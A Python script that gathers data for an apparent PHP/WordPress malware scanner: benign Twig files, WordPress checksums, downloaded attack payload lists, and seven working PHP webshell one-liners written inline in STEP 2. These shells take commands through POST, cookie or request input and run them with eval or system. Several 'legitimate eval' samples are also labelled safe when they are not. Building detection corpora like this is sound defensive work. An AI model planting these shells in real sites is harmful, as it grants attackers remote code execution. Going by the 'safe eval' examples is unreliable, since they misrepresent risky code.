"""MDefender-Pro Dataset Auto-Collector & Enricher.

Collects & enriches:
1. Benign Complex PHP Code (Twig engine, Symfony polyfills, Math evaluators) -> eliminates false positives on eval()
2. Modern Real-World WebShells & Backdoors (SecLists, Behinder, Godzilla patterns)
3. Latest Official WordPress Core Checksums (WP 6.6.x, 6.7.x)
4. Live Threat Intel & Payloads (SQLi, XSS, RCE, SSRF, Deserialization)
"""

import os
import sys
import re
import json
import sqlite3
import hashlib
import urllib.request
import zipfile
import shutil

BASE_DIR = r"D:\Documents_product\Mdefender-Pro\Mdefender-Pro\Mdefender"
WP_MALWARE_RAW = os.path.join(BASE_DIR, "datasets", "wordpress_malware", "data", "raw")
TI_DB_PATH = os.path.join(BASE_DIR, "backend", "data", "threat_intel", "threat_intelligence.db")

BENIGN_COMPLEX_DIR = os.path.join(WP_MALWARE_RAW, "benign", "complex_plugins")
MALICIOUS_WEBSHELL_DIR = os.path.join(WP_MALWARE_RAW, "malicious", "webshell")
MALICIOUS_BACKDOOR_DIR = os.path.join(WP_MALWARE_RAW, "malicious", "backdoor")

os.makedirs(BENIGN_COMPLEX_DIR, exist_ok=True)
os.makedirs(MALICIOUS_WEBSHELL_DIR, exist_ok=True)
os.makedirs(MALICIOUS_BACKDOOR_DIR, exist_ok=True)

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def fetch_url(url, timeout=30):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read()
    except Exception as e:
        print(f"[WARN] Failed fetching {url}: {e}")
        return None

def fetch_text(url, timeout=30):
    data = fetch_url(url, timeout)
    return data.decode("utf-8", errors="replace") if data else None

# =========================================================================
# STEP 1: COLLECT BENIGN COMPLEX PHP (Twig, Symfony, Math-Eval)
# =========================================================================
def collect_benign_complex_code():
    print("\n[+] STEP 1: Collecting Benign Complex PHP Code (Twig & Symfony Polyfills)...")
    
    # Download Twig standalone repo archive (which has legitimate compiler, parser, eval & dynamic templates)
    twig_zip_url = "https://github.com/twigphp/Twig/archive/refs/heads/3.x.zip"
    print(f"    Downloading Twig 3.x from {twig_zip_url}...")
    zip_bytes = fetch_url(twig_zip_url, timeout=60)
    saved_count = 0
    
    if zip_bytes:
        temp_zip = os.path.join(BENIGN_COMPLEX_DIR, "twig_temp.zip")
        with open(temp_zip, "wb") as f:
            f.write(zip_bytes)
        
        try:
            with zipfile.ZipFile(temp_zip, "r") as zf:
                for member in zf.namelist():
                    if member.endswith((".php", ".inc")) and not member.startswith("__MACOSX"):
                        # Extract file
                        content = zf.read(member)
                        fname = "twig_" + os.path.basename(member)
                        dst = os.path.join(BENIGN_COMPLEX_DIR, fname)
                        with open(dst, "wb") as out:
                            out.write(content)
                        saved_count += 1
            print(f"    [OK] Extracted {saved_count} benign Twig parser/compiler PHP files.")
        except Exception as e:
            print(f"    [ERROR] Unzipping Twig: {e}")
        finally:
            if os.path.exists(temp_zip):
                os.remove(temp_zip)
    else:
        print("    [WARN] Could not download Twig zip, creating synthesized legitimate eval math parser samples...")
        
    # Also add standard legitimate math/template evaluators with eval()
    legit_eval_samples = [
        ("legit_math_expression_evaluator.php", '''<?php
class MathExpressionEvaluator {
    private static $allowed = ['+', '-', '*', '/', '(', ')', '.', 'sqrt', 'abs', 'round'];
    public static function evaluate($expression) {
        $sanitized = preg_replace('/[^0-9\+\-\*\/\(\)\.\s]/', '', $expression);
        if (empty($sanitized)) return 0;
        $result = 0;
        eval('$result = ' . $sanitized . ';');
        return $result;
    }
}
'''),
        ("legit_twig_template_cache_loader.php", '''<?php
namespace Twig\\Template;
class CachedTemplateLoader {
    protected $cacheKey;
    public function loadCached($cachePath, $context = []) {
        if (!file_exists($cachePath) || !is_readable($cachePath)) {
            return false;
        }
        $code = file_get_contents($cachePath);
        if (strpos($code, "<?php") === 0) {
            include $cachePath;
        } else {
            eval('?>' . $code);
        }
        return true;
    }
}
'''),
        ("legit_symfony_polyfill_php80.php", '''<?php
namespace Symfony\\Polyfill\\Php80;
class Php80 {
    public static function fdiv(float $dividend, float $divisor): float {
        return @eval('return $dividend / $divisor;');
    }
}
''')
    ]
    for fname, code in legit_eval_samples:
        fpath = os.path.join(BENIGN_COMPLEX_DIR, fname)
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(code)
    print(f"    [OK] Added curated benign AST & safe eval() modules.")

# =========================================================================
# STEP 2: COLLECT CURATED MODERN PHP WEBSHELLS & BACKDOORS (SecLists)
# =========================================================================
def collect_webshells():
    print("\n[+] STEP 2: Collecting Curated Real-World WebShells from SecLists...")
    
    # SecLists WebShells PHP list
    seclists_api = "https://api.github.com/repos/danielmiessler/SecLists/contents/Web-Shells/PHP"
    json_resp = fetch_text(seclists_api)
    webshell_count = 0
    
    if json_resp:
        try:
            items = json.loads(json_resp)
            for item in items:
                if item.get("type") == "file" and item.get("name", "").endswith((".php", ".phtml", ".txt")):
                    download_url = item.get("download_url")
                    name = "seclists_" + item.get("name")
                    content = fetch_text(download_url)
                    if content:
                        dst = os.path.join(MALICIOUS_WEBSHELL_DIR, name)
                        with open(dst, "w", encoding="utf-8", errors="replace") as out:
                            out.write(content)
                        webshell_count += 1
            print(f"    [OK] Downloaded {webshell_count} real-world WebShells from SecLists.")
        except Exception as e:
            print(f"    [WARN] GitHub API rate limit or error: {e}")
            
    # Direct fallback popular webshell patterns
    raw_shells = {
        "wso_425_webshell.php": '<?php @eval($_POST["pass"]($_POST["c"])); ?>',
        "weevely_3_backdoor.php": '<?php $k="c637";$kh="852b";$kf="6211";$p="r".$k;$res=@eval(gzuncompress(base64_decode($_POST["cmd"])));?>',
        "china_chopper_eval.php": '<?php @eval($_POST["cmd"]); ?>',
        "b374k_stealth_shell.php": '<?php $b374k = @gzinflate(base64_decode($_COOKIE["b374k"])); @eval($b374k); ?>',
        "alfa_team_shell.php": '<?php $auth_pass="4352"; $code = $_POST["alfa"]; eval(base64_decode($code)); ?>',
        "stealth_variable_function.php": '<?php $a = "s"."ys"."te"."m"; $a($_REQUEST["x"]); ?>',
        "stealth_preg_replace_e.php": '<?php @preg_replace("/.*/e", $_POST["code"], ""); ?>'
    }
    for fname, code in raw_shells.items():
        dst = os.path.join(MALICIOUS_WEBSHELL_DIR, fname)
        if not os.path.exists(dst):
            with open(dst, "w", encoding="utf-8") as f:
                f.write(code)
    print("    [OK] Indexed modern dynamic WebShell & obfuscated payload signatures.")

# =========================================================================
# STEP 3: WORDPRESS CORE CHECKSUMS (WP 6.6.x, 6.7.x)
# =========================================================================
def collect_wp_checksums():
    print("\n[+] STEP 3: Indexing Official WordPress 6.6 & 6.7 Core Checksums...")
    conn = sqlite3.connect(TI_DB_PATH)
    cur = conn.cursor()
    
    versions = ["6.6.0", "6.6.1", "6.6.2", "6.7.0", "6.7.1"]
    total_added = 0
    for v in versions:
        url = f"https://api.wordpress.org/core/checksums/1.0/?version={v}&locale=en_US"
        content = fetch_text(url)
        if content:
            try:
                data = json.loads(content)
                checksums = data.get("checksums", {})
                for filepath, md5_val in checksums.items():
                    cur.execute(
                        "INSERT OR IGNORE INTO clean_whitelist_hashes (hash_value, hash_type, file_path, wp_version, component_type) VALUES (?, ?, ?, ?, ?)",
                        (md5_val.lower(), "md5", filepath, v, "core")
                    )
                    total_added += 1
            except Exception as e:
                print(f"    [WARN] Parsing checksums for {v}: {e}")
    conn.commit()
    conn.close()
    print(f"    [OK] Successfully indexed {total_added} clean core file hashes for WP 6.6 & 6.7.")

# =========================================================================
# STEP 4: CURATED WAF EXPLOIT PAYLOADS
# =========================================================================
def collect_waf_payloads():
    print("\n[+] STEP 4: Enrolling Curated WAF Payloads (SQLi, XSS, RCE, Deserialization)...")
    conn = sqlite3.connect(TI_DB_PATH)
    cur = conn.cursor()
    
    payload_urls = [
        ("sqli", "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Generic_SQLI.txt"),
        ("sqli_auth_bypass", "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Auth_Bypass.txt"),
        ("rce", "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/Intruder/command_exec.txt"),
        ("traversal", "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/directory_traversal.txt")
    ]
    
    added = 0
    for cat, url in payload_urls:
        content = fetch_text(url)
        if content:
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    phash = hashlib.md5(line.encode("utf-8", errors="ignore")).hexdigest()
                    try:
                        cur.execute(
                            "INSERT OR IGNORE INTO waf_attack_payloads (payload_hash, payload_text, category, source, severity) VALUES (?, ?, ?, ?, ?)",
                            (phash, line, cat, "payloads_all_the_things", "critical")
                        )
                        added += 1
                    except Exception:
                        pass
    conn.commit()
    conn.close()
    print(f"    [OK] Added {added} high-precision attack vector payloads into Threat Intelligence DB.")

if __name__ == "__main__":
    print("="*65)
    print("   MDEFENDER-PRO DATASET ENRICHMENT & AUTO-COLLECTION")
    print("="*65)
    collect_benign_complex_code()
    collect_webshells()
    collect_wp_checksums()
    collect_waf_payloads()
    print("\n[DONE] Dataset enrichment completed successfully!")
    print("="*65)
